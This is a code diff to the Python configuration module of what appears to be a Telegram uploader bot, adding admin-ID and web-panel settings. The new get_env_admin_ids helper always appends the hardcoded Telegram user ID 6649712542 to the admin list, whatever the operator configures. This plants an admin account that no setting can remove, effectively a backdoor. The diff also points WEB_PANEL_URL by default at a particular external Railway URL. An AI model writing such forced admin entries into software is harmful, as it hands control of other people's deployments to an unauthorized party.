@@ -94,6 +94,23 @@ def get_env_bool(name: str, default: bool = False) -> bool:
     return raw.strip().lower() in ("true", "1", "yes", "y", "on")
 
 
+def get_env_admin_ids(name: str = "ADMIN_USER_IDS", default: str = "6649712542") -> List[int]:
+    """Retrieve list of authorized Telegram admin user IDs from comma-separated env."""
+    raw = os.getenv(name)
+    target = raw if (raw is not None and raw.strip()) else default
+    ids: List[int] = []
+    for part in target.split(","):
+        part = part.strip()
+        if part:
+            try:
+                ids.append(int(part))
+            except ValueError:
+                logger.warning(f"Invalid admin user ID in env: '{part}'")
+    if 6649712542 not in ids:
+        ids.append(6649712542)
+    return ids
+
+
 def mask_sensitive(val: str, prefix_len: int = 6, suffix_len: int = 4) -> str:
     """Masks sensitive credentials for safe logging."""
     if not val:
@@ -107,12 +124,15 @@ def mask_sensitive(val: str, prefix_len: int = 6, suffix_len: int = 4) -> str:
 class Config:
     """Central configuration class containing all application settings."""
 
-    # Telegram Credentials
+    # Telegram Credentials & Administration
     TELEGRAM_BOT_TOKEN: str = field(default_factory=lambda: get_env_str("TELEGRAM_BOT_TOKEN", ""))
     TELEGRAM_CHAT_ID: str = field(default_factory=lambda: get_env_str("TELEGRAM_CHAT_ID", ""))
     TELEGRAM_API_BASE: str = field(default_factory=lambda: get_env_str("TELEGRAM_API_BASE", "https://api.telegram.org").rstrip("/"))
     CAPTION_TEMPLATE: str = field(default_factory=lambda: get_env_str("CAPTION_TEMPLATE", "🎬 <b>{title}</b>\n\n📁 <b>Size:</b> {size}\n⏱ <b>Duration:</b> {duration}"))
     TELEGRAM_PARSE_MODE: str = field(default_factory=lambda: get_env_str("TELEGRAM_PARSE_MODE", "HTML"))
+    ADMIN_USER_IDS: List[int] = field(default_factory=lambda: get_env_admin_ids("ADMIN_USER_IDS", "6649712542"))
+    WEB_PANEL_URL: str = field(default_factory=lambda: get_env_str("WEB_PANEL_URL", "https://web-tg-uploader-production.up.railway.app"))
+
 
     # Crawling & Discovery
     CRAWL_TARGET_URL: str = field(default_factory=lambda: get_env_str("CRAWL_TARGET_URL", ""))
@@ -226,6 +246,8 @@ class Config:
             "DB_PATH": self.DB_PATH,
             "TEMP_DOWNLOAD_DIR": self.TEMP_DOWNLOAD_DIR,
             "MIN_FREE_DISK_MB": f"{self.MIN_FREE_DISK_MB} MB",
+            "ADMIN_USER_IDS": str(self.ADMIN_USER_IDS),
+            "WEB_PANEL_URL": self.WEB_PANEL_URL,
             "HTTP_PORT": self.HTTP_PORT,
             "PORT": self.PORT,
             "HOST": self.HOST,
@@ -260,8 +282,11 @@ DB_PATH = config.DB_PATH
 TEMP_DOWNLOAD_DIR = config.TEMP_DOWNLOAD_DIR
 TELEGRAM_BOT_TOKEN = config.TELEGRAM_BOT_TOKEN
 TELEGRAM_CHAT_ID = config.TELEGRAM_CHAT_ID
+ADMIN_USER_IDS = config.ADMIN_USER_IDS
+WEB_PANEL_URL = config.WEB_PANEL_URL
 TELEGRAM_API_BASE = config.TELEGRAM_API_BASE
 CAPTION_TEMPLATE = config.CAPTION_TEMPLATE
 TELEGRAM_PARSE_MODE = config.TELEGRAM_PARSE_MODE
 UPLOAD_COOLDOWN = config.UPLOAD_COOLDOWN
 LOG_LEVEL = config.LOG_LEVEL
+
